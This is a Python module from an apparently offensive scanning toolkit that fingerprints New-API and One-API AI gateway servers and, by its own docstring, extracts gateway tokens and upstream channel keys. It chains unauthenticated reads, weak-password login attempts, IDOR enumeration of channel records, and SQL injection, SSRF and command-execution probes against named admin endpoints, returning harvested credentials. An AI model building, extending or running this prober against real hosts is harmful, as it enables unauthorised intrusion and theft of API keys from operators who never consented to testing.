"""New-API / One-API prober — gateway token + channel key extraction."""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential

from ..base import Prober
from ..capability import ProbeSpec, RiskLevel, VulnClass
from ._l2l3 import rce_spec, sqli_spec, ssrf_spec

log = logging.getLogger(__name__)

_GATEWAY_SPECS_TEMPLATE = (
    (
        "unauth",
        VulnClass.UNAUTH_READ,
        RiskLevel.L0,
        False,
        {
            "paths": ["/v1/models", "/api/status"],
        },
        (),
        4,
    ),
    (
        "weak_password",
        VulnClass.WEAK_PASSWORD,
        RiskLevel.L1,
        False,
        {
            "auth_style": "login_json",
            "login": "/api/user/login",
            "body": {"username": "{user}", "password": "{pass}"},
            "success_field": "success",
            "token_fields": ["token", "access_token"],
            "post_auth_paths": ["/api/token/", "/api/channel/", "/api/user/self"],
        },
        (),
        12,
    ),
    (
        "idor_channel",
        VulnClass.IDOR,
        RiskLevel.L1,
        True,
        {
            "list": "/api/channel/",
            "object": "/api/channel/{id}",
            "id_enum_max": 5,
            "id_fields": ["id", "Id"],
            "use_auth": True,
        },
        ("weak_password",),
        6,
    ),
)


def _specs_for(product: str, tag: str) -> list[ProbeSpec]:
    specs: list[ProbeSpec] = []
    for name, vclass, risk, needs_auth, entry, deps_suffix, max_req in _GATEWAY_SPECS_TEMPLATE:
        dep_ids = tuple(f"{product}.{d}" for d in deps_suffix) if deps_suffix else ()
        specs.append(
            ProbeSpec(
                id=f"{product}.{name}",
                product=product,
                vuln_class=vclass,
                risk_level=risk,
                requires_auth=needs_auth,
                depends_on=dep_ids,
                entry={**entry, "tag_prefix": f"{tag}_{name}"},
                max_requests=max_req,
            )
        )
    # L2/L3: gateway admin search + occasional proxy test hooks (gated by policy).
    specs.extend(
        [
            sqli_spec(
                product,
                path="/api/log/",
                param="username",
                use_auth=True,
                suffix="sqli_log",
            ),
            ssrf_spec(
                product,
                path="/api/channel/test",
                url_param="base_url",
                body={"type": 1},
                use_auth=True,
                suffix="ssrf_channel_test",
            ),
            rce_spec(
                product,
                path="/api/system/test",
                param="cmd",
                use_auth=True,
                suffix="rce_system_test",
            ),
        ]
    )
    return specs


NEWAPI_SPECS = _specs_for("new-api", "newapi")
ONEAPI_SPECS = _specs_for("one-api", "oneapi")


class NewAPIProber(Prober):
    product_name = "new-api"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "new-api" in blob or "new api" in blob or "newapi" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await self.run_specs(hit, NEWAPI_SPECS)


class OneAPIProber(Prober):
    """One-API is the upstream of New-API — same API surface."""

    product_name = "one-api"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "one api" in blob or "one-api" in blob or "oneapi" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await self.run_specs(hit, ONEAPI_SPECS)
